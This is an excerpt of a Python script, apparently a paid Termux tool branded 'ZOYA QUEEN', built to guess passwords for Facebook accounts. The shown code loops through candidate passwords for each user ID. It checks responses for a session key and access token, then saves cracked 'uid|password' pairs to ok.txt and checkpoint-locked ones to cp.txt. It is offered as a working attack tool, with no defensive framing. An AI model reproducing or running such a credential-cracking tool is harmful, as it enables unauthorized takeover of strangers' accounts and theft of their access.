...
|__/     |__/|________/   |__/  |__/  |__/       \______/     |__/    |________/|_______/
   ...
   \x1b[1;92m║ TOOL NAME : { ZOYA QUEEN }   ║

   \x1b[1;92m║ AUTHOR    :ZOYA QUEEN      ║

   \x1b[1;92m║ GITHUB    : TERMUX-ZOYA║

   \x1b[1;92m║ FACEBOOK  : ZOYA QUEEN   ║
...
class Main:
	...
	def __init__(self):
		...
		print(' \033[1;96m[✯]NOTE : THIS TOOL IS PAID 😍 \033[0m')
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			...
			"\r\r\033[92;1m WAIT AND SEE  [ ZOYA-QIEEN]  ENJOY MY TOOLS "
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write("  * [ZOYA]--> %s|%s\n"%(uid, pw))

				break

			elif "www.facebook.com" in response.json()["error_msg"]:

				print("\r  \033[0;91m   [ZOYA-CP] %s | %s\033[0;97m         "%(uid, pw))

				self.cp.append("%s|%s"%(uid, pw))

				open("cp.txt","a").write("  * [ZOYA]--> %s|%s\n"%(uid, pw))
